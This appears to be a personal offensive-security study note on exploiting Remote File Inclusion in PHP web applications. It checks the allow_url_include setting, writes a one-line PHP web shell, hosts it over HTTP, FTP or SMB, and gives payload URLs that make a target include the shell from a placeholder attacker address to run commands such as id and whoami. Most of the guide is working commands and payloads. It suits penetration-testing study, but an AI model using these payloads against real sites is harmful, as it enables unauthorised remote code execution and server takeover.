In this [page](obsidian://open?vault=security-notes&file=Offensive%20Security%2FWeb%20Application%20Security%2FServer-side%20Vulnerabilities%2FFile%20Inclusion%20Vulnerabilities%2FRead%20vs%20Execute), we see that some functions allows the inclusion of remote URLs, which lets attackers to include remote files, this is called Remote File Inclusion. This allows two main benefits:
1. Enumerating local-only ports and web applications (i.e. SSRF)
2. Gaining remote code execution by including a malicious script that we host
## Verify RFI
First, we have to verify if RFI is possible. In PHP applications, we would look for `allow_url_include` setting being enabled. To do this, we can use the `convert.base64-encode` for the `read` parameter [technique](obsidian://open?vault=security-notes&file=Offensive%20Security%2FWeb%20Application%20Security%2FServer-side%20Vulnerabilities%2FFile%20Inclusion%20Vulnerabilities%2FFile%20Disclosures%2FUsing%20PHP%20Wrappers) to read PHP configuration files, and look for the `allow_url_include` setting.
```bash
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On
```
However, this may not always be reliable, as even if the setting is enabled, the vulnerable function may not allow remote URL inclusion to begin with. So, a more reliable way to determine whether an LFI vulnerability is also vulnerable to RFI is to try and include a URL, and see if we can get its content. For example:
```txt
http://target-website.com/?language=http://127.0.0.1/index.php
```
> Note: We should always try to include a local URL first to ensure our attempt doesn't get blocked by a firewall or other security measure. Additionally, we should avoid including the vulnerable page itself as this may cause a recursive inclusion loop, leading to a DoS attack on the server.
## Remote Code Execution with RFI
The first step in gaining remote code execution is creating a malicious script in the language of the web application. We can use a custom web shell we download from the internet, use a reverse shell script, or write our own basic web shell. For example:
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```
Now, all we have to do is host this script and include it through the RFI vulnerability. It is also a good idea to set our shell listener to common ports like `80` and `443`, as these ports may be whitelisted by the application's security measures. For example:
```bash
python3 -m http.server 80
```
Now, we can include our local shell through RFI as follows:
```txt
http://target-website.com/?language=http://OUR_IP/shell.php&cmd=id
```
### FTP
Additionally, we may also host our shell through FTP protocol. We can use Python's `pyftpdlib` as follows:
```bash
python3 -m pyftpdlib -p 21
```
This may also be useful in case http ports are blocked by a firewall or the `http://` string gets blocked by a WAF. To include our script, we can repeat what we did earlier, but use the `ftp://` scheme in the URL, as follows:
```txt
http://target-website.com/?language=ftp://OUR_IP/shell.php&cmd=id
```
If the server required valid authentication, then the credentials then be specified in the URL as follows:
```txt
http://target-website.com/?language=ftp://username:password@OUR_IP/shell.php&cmd=id
```
### SMB
If the vulnerable web application is hosted on a Windows server, then we do not need the `allow_url_include` setting to be enabled for RFI to be possible. We can instead utilize the SMB protocol. First, we can spin up an SMB server using `Impacket's smbserver.py`, which allows anonymous authentication by default, as follows:
```bash
impacket-smbserver -smb2support share $(pwd)
```
Now, we can include our script by using a UNC path (e.g. `\\<OUR_IP>\share\shell.php`), as follows:
```txt
http://target-website.com/?language=\\OUR_IP\share\shell.php&cmd=whoami
```